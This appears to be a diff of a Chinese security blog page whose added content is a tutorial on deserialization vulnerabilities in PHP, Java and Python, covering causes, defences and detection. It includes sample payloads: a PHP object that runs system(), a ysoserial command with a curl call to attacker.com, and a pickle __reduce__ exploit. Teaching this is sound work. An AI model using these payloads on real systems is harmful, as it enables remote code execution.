@@ -6,20 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://erwuyishiqi-1017.github.io">
-  <title>二五一十七</title>
+  <title>反序列化漏洞 | 二五一十七</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-    
-    <!-- <meta name="keywords" content="">
-    <meta name="description" content=""> -->
-  
-  <meta property="og:type" content="website">
-<meta property="og:title" content="二五一十七">
-<meta property="og:url" content="https://erwuyishiqi-1017.github.io/">
+  <meta name="description" content="漏洞概述反序列化漏洞（Deserialization Vulnerability）指攻击者通过篡改序列化数据，在目标系统反序列化过程中触发非预期行为，导致远程代码执行（RCE）、权限提升或数据篡改等安全风险。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反序列化漏洞">
+<meta property="og:url" content="https://erwuyishiqi-1017.github.io/2025/02/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
 <meta property="og:site_name" content="二五一十七">
+<meta property="og:description" content="漏洞概述反序列化漏洞（Deserialization Vulnerability）指攻击者通过篡改序列化数据，在目标系统反序列化过程中触发非预期行为，导致远程代码执行（RCE）、权限提升或数据篡改等安全风险。">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-02-12T08:11:29.000Z">
+<meta property="article:modified_time" content="2025-03-11T04:31:45.576Z">
 <meta property="article:author" content="二五一十七">
+<meta property="article:tag" content="反序列化">
 <meta name="twitter:card" content="summary">
   
   
@@ -159,271 +160,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-
-  
-    <article id="post-SQL注入笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-反序列化漏洞" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2025/02/12/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" target="_blank">SQL注入笔记</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2025/02/12/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-        <time datetime="2025-02-12T08:11:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-12</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="SQL注入（SQL-Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。"><a href="#SQL注入（SQL-Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。" class="headerlink" title="SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。"></a>SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。
-    
-    <a class="article-more-a" href="/2025/02/12/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/#more">展开全文 >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">SQL</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-XSS(跨站脚本)笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2025/02/12/XSS(%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC)%E7%AC%94%E8%AE%B0/" target="_blank">XSS(跨站脚本)笔记</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2025/02/12/XSS(%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC)%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-        <time datetime="2025-02-12T08:11:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-12</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="XSS又叫CSS（Cross-Site-Script）跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。"><a href="#XSS又叫CSS（Cross-Site-Script）跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。" class="headerlink" title="XSS又叫CSS（Cross Site Script）跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。"></a>XSS又叫CSS（Cross Site Script）跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
-    
-    <a class="article-more-a" href="/2025/02/12/XSS(%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC)%E7%AC%94%E8%AE%B0/#more">展开全文 >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XSS</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-PHP伪协议" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2025/02/12/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank">PHP伪协议</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2025/02/12/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="archive-article-date">
-        <time datetime="2025-02-12T08:11:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-12</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="什么是PHP伪协议？"><a href="#什么是PHP伪协议？" class="headerlink" title="什么是PHP伪协议？"></a>什么是PHP伪协议？</h2><p>PHP伪协议是PHP自己支持的一种协议与封装协议，简单来说就是PHP定义的一种特殊访问资源的方法。
-    
-    <a class="article-more-a" href="/2025/02/12/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/#more">展开全文 >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">php</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-反序列化漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2025/02/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank">反序列化漏洞</a>
-  
+    <h1 class="article-title" itemprop="name">
+      反序列化漏洞
     </h1>
   
 
@@ -437,16 +181,227 @@
   
   
     
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">1.7k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">6分</span>
+    </span>
+  </span>
+</div>
+
 
   
   </header>
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>反序列化漏洞（Deserialization Vulnerability）指攻击者通过篡改序列化数据，在目标系统反序列化过程中触发非预期行为，导致远程代码执行（RCE）、权限提升或数据篡改等安全风险。
-    
-    <a class="article-more-a" href="/2025/02/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">展开全文 >></a>
-    
+    <h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>反序列化漏洞（Deserialization Vulnerability）指攻击者通过篡改序列化数据，在目标系统反序列化过程中触发非预期行为，导致远程代码执行（RCE）、权限提升或数据篡改等安全风险。<span id="more"></span></p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要了解反序列化漏洞，首先我们得知道什么是序列化和反序列化，简单来说序列化：就是将对象转化为字符串进行存储；反序列化：就是将字符串转化为对象；反序列化漏洞：就是在反序列化过程中，如果恶意者可以对将要转换的字符串进行操控，从而达到任意代码执行的操作，就是反序列化漏洞。</p>
+<h3 id="序列化（Serialization）"><a href="#序列化（Serialization）" class="headerlink" title="序列化（Serialization）"></a>序列化（<strong>Serialization</strong>）</h3><p>将对象的状态信息转换为可以存储或传输的形式的过程，一般将对象转换为字节流。序列化时，对象的当前状态被写入到临时或持久性存储区（文件、内存、数据库等）</p>
+<h3 id="反序列化（Deserialization）"><a href="#反序列化（Deserialization）" class="headerlink" title="反序列化（Deserialization）"></a>反序列化（<strong>Deserialization</strong>）</h3><p>从序列化的表示形式中提取数据，即把有序字节流恢复为对象的过程</p>
+<h3 id="反序列化攻击"><a href="#反序列化攻击" class="headerlink" title="反序列化攻击"></a>反序列化攻击</h3><p>攻击者控制了序列化后的数据，将有害数据传递到应用程序代码中，发动针对应用程序的攻击。</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><h3 id="核心原因"><a href="#核心原因" class="headerlink" title="核心原因"></a>核心原因</h3><ul>
+<li>反序列化不可信数据源</li>
+<li>存在危险魔术方法（PHP）&#x2F;危险类方法（Java）</li>
+<li>使用有漏洞的序列化库（如Apache Commons Collections）</li>
+<li>未对序列化数据签名验证</li>
+</ul>
+<h3 id="辅助因素"><a href="#辅助因素" class="headerlink" title="辅助因素"></a>辅助因素</h3><ul>
+<li>暴露序列化接口（API&#x2F;RPC）</li>
+<li>调试信息泄露序列化数据</li>
+<li>使用默认加密密钥</li>
+<li>框架配置不当</li>
+</ul>
+<h3 id="序列化与反序列化流程"><a href="#序列化与反序列化流程" class="headerlink" title="序列化与反序列化流程"></a>序列化与反序列化流程</h3><p>原始对象 → 序列化 → 字节流&#x2F;字符串 → 传输 → 反序列化 → 重建对象</p>
+<h3 id="攻击面分析"><a href="#攻击面分析" class="headerlink" title="攻击面分析"></a>攻击面分析</h3><table>
+<thead>
+<tr>
+<th>语言</th>
+<th>关键机制</th>
+<th>触发点示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PHP</td>
+<td>__wakeup(), __destruct()</td>
+<td>phar:&#x2F;&#x2F;协议自动反序列化</td>
+</tr>
+<tr>
+<td>Java</td>
+<td>readObject()方法</td>
+<td>Apache Commons Collections</td>
+</tr>
+<tr>
+<td>Python</td>
+<td><strong>reduce</strong>()方法</td>
+<td>pickle模块</td>
+</tr>
+</tbody></table>
+<h2 id="关键函数-类"><a href="#关键函数-类" class="headerlink" title="关键函数&#x2F;类"></a>关键函数&#x2F;类</h2><h3 id="PHP常用魔术方法"><a href="#PHP常用魔术方法" class="headerlink" title="PHP常用魔术方法"></a>PHP常用魔术方法</h3><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>__sleep()</td>
+<td>使用serialize（）时触发</td>
+</tr>
+<tr>
+<td>__destruct()</td>
+<td>对象被销毁时触发，在脚本终止或对象引用计数为0时调用，通常会执行数据清除就或连接断开操作</td>
+</tr>
+<tr>
+<td>__call()</td>
+<td>在对象上下文中调用不可访问的方法时触发 ，通常用于错误处理，防止脚本因为调用错误而终止执行</td>
+</tr>
+<tr>
+<td>__callStatic</td>
+<td>在静态上下文中调用不可访问的方法时触发</td>
+</tr>
+<tr>
+<td>__get()</td>
+<td>用于从不可访问的属性读取数据，通常用于设置和获取对象私有属性</td>
+</tr>
+<tr>
+<td>__set()</td>
+<td>用于将数据写入不可访问的属性，通常用于设置和获取对象私有属性</td>
+</tr>
+<tr>
+<td>__isset()</td>
+<td>在不可访问的属性上调用isset()或empty()触发</td>
+</tr>
+<tr>
+<td>__unset()</td>
+<td>在不可访问的属性上使用unset()时触发</td>
+</tr>
+<tr>
+<td>__invoke()</td>
+<td>当脚本尝试将对象调用为函数时触发</td>
+</tr>
+<tr>
+<td>__clone()</td>
+<td>当把一个对象赋给另一个对象时自动调用</td>
+</tr>
+<tr>
+<td>__wakeup()</td>
+<td>unserialize函数会检查是否存在wakeup方法，如果存在则先调用wakeup方法，做一些必要的初始化连数据库等操作</td>
+</tr>
+<tr>
+<td>__construct()</td>
+<td>PHP5允许在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法</td>
+</tr>
+<tr>
+<td>__destruct()</td>
+<td>PHP5引入析构函数的概念，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行</td>
+</tr>
+<tr>
+<td>__toString()</td>
+<td>用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误</td>
+</tr>
+</tbody></table>
+<h3 id="PHP举例："><a href="#PHP举例：" class="headerlink" title="PHP举例："></a>PHP举例：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 序列化与反序列化函数</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 危险魔术方法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VulnClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* 反序列化时触发 */</span> &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* 对象销毁时触发 */</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="JAVA常用魔术方法"><a href="#JAVA常用魔术方法" class="headerlink" title="JAVA常用魔术方法"></a>JAVA常用魔术方法</h3><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>readObject()</td>
+<td>自定义反序列化逻辑（危险操作高发区）</td>
+</tr>
+<tr>
+<td>readResolve()</td>
+<td>反序列化后替换对象的入口</td>
+</tr>
+<tr>
+<td>finalize()</td>
+<td>对象销毁时触发的逻辑</td>
+</tr>
+</tbody></table>
+<h3 id="JAVA举例："><a href="#JAVA举例：" class="headerlink" title="JAVA举例："></a>JAVA举例：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 典型漏洞代码</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject(); <span class="comment">// 危险操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 危险类示例</span></span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">javax.script.ScriptEngine</span><br></pre></td></tr></table></figure>
+<h3 id="Python常用魔术方法及函数"><a href="#Python常用魔术方法及函数" class="headerlink" title="Python常用魔术方法及函数"></a>Python常用魔术方法及函数</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>pickle.dump(obj, file)</td>
+<td>将对象序列化后保存到文件。</td>
+</tr>
+<tr>
+<td>pickle.load(file)</td>
+<td>读取文件， 将文件中的序列化内容反序列化为对象。</td>
+</tr>
+<tr>
+<td>pickle.dumps(obj)</td>
+<td>将对象序列化成字符串格式的字节流。</td>
+</tr>
+<tr>
+<td>pickle.loads(bytes_obj)</td>
+<td>将字符串格式的字节流反序列化为对象。</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>__reduce__()</code></td>
+<td>反序列化时调用。</td>
+</tr>
+<tr>
+<td><code>__setstate__（）</code></td>
+<td>反序列化时调用。</td>
+</tr>
+<tr>
+<td><code>__getstate__()</code></td>
+<td>序列化时调用。</td>
+</tr>
+</tbody></table>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="comment"># 危险反序列化操作</span></span><br><span class="line">data = pickle.loads(request.data) </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><h3 id="利用链构建"><a href="#利用链构建" class="headerlink" title="利用链构建"></a>利用链构建</h3><p><strong>寻找起点</strong>：找到可控的反序列化入口<br><strong>挖掘Gadget</strong>：查找可串联调用的类方法<br><strong>构造Payload</strong>：组合调用链达成攻击目标</p>
+<h3 id="典型攻击模式"><a href="#典型攻击模式" class="headerlink" title="典型攻击模式"></a>典型攻击模式</h3><ul>
+<li><strong>PHP攻击示例</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造恶意对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Exploit</span>); <span class="comment">// 生成Payload</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Java攻击示例</strong></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用ysoserial工具生成Payload：</span><br><span class="line"></span><br><span class="line">bash</span><br><span class="line"></span><br><span class="line">复制</span><br><span class="line"></span><br><span class="line">java -jar ysoserial.jar CommonsCollections5 <span class="string">&quot;curl http://attacker.com&quot;</span> &gt; payload.bin</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Python攻击示例</strong></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">复制</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(Exploit()))) </span><br></pre></td></tr></table></figure>
+<h3 id="高级利用技巧"><a href="#高级利用技巧" class="headerlink" title="高级利用技巧"></a>高级利用技巧</h3><p><strong>二次反序列化</strong>：通过序列化对象包含其他序列化数据<br><strong>内存马注入</strong>：Java反序列化植入Webshell<br><strong>PHAR伪协议</strong>：PHP通过文件操作触发反序列化<br><strong>绕过字符过滤</strong>：使用Unicode&#x2F;十六进制编码</p>
+<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><p>输入验证<br>PHP使用类型限制<br>签名验证<br>使用JSON等安全数据格式替代序列化<br>启用反序列化防火墙（如Java Agent防护）<br>日志监控异常反序列化操作<br>定期进行代码审计</p>
+<h3 id="安全配置"><a href="#安全配置" class="headerlink" title="安全配置"></a>安全配置</h3><p>禁止反序列化不可信数据<br>升级有漏洞的依赖库（如commons-collections 4.4+）<br>配置Java安全管理器（SecurityManager）<br>设置PHP的unserialize_callback_func</p>
+<h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p><strong>静态分析</strong>：查找反序列化函数调用（unserialize、readObject等）<br><strong>动态测试</strong>：使用工具生成Payload测试（ysoserial、phpggc）<br><strong>流量监控</strong>：检测序列化数据的异常特征<br><strong>沙箱检测</strong>：在隔离环境执行可疑序列化数据</p>
+<h2 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表"></a>工具列表</h2><p>Java：ysoserial、marshalsec<br>PHP：phpggc、PHPGGC<br>Python：fickling、dill<br>通用：Burp Suite的Java Deserialization Scanner插件</p>
+
     
 
     
@@ -478,92 +433,26 @@
   </div>
 </article>
 
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
+
+<nav id="article-nav">
+  
+    <a href="/2025/02/12/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
         
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
+          PHP伪协议
         
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-文件包含漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
+      </div>
+    </a>
   
   
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2025/02/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" target="_blank">文件包含漏洞</a>
+    <a href="/2025/02/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">文件包含漏洞</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
-    </h1>
-  
+</nav>
 
-
-  
-  
-<a href="/2025/02/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-        <time datetime="2025-02-12T08:11:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-12</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>文件包含漏洞（File Inclusion Vulnerability）指攻击者通过控制文件包含函数的参数，读取任意文件或执行远程代码的漏洞类型。主要分为两类：</p>
-<ul>
-<li><strong>本地文件包含（LFI）</strong>：包含服务器本地文件</li>
-<li><strong>远程文件包含（RFI）</strong>：包含远程服务器文件（需特定配置）
-    
-    <a class="article-more-a" href="/2025/02/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#more">展开全文 >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">文件包含</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -578,266 +467,33 @@
         </div>
         
         
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-文件上传漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" target="_blank">文件上传漏洞</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-        <time datetime="2025-02-12T08:11:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-12</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>文件上传漏洞（Unrestricted File Upload）指攻击者利用未严格校验的文件上传功能，向服务器上传恶意文件并执行，进而获取服务器权限或破坏系统完整性。
-    
